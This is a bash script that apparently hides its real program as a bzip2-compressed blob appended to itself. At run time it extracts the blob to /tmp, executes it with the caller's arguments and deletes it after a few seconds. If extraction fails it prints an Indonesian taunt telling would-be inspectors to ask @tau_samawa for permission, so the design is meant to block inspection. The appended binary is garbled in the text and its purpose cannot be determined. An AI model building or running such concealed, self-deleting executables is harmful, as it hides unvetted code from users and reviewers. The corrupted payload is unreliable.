#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYu.�  4_� ~���H  /����0L��)2'�M6����h�4    4 � �Jz�0��i=&&�2`��OS�]�xYɁC8K+,�&C�KCB�0����m�X��A�X�N�KȨ���F��H1�1�(�I���	G�KW^[u�Pȸ�9"�O�@�~�T�+y�e)o��u!<�T�7����e�X�Lp5��V�ǿi��E��(�?��H�tC�yI+�3�S��9q��^Ȭ2.x��%���[0[��H���dU��J���	���� ���VQ1����AIY�{�4#d�:�j�^���er��O*`�\��eY�+N`��y�.�p� �]�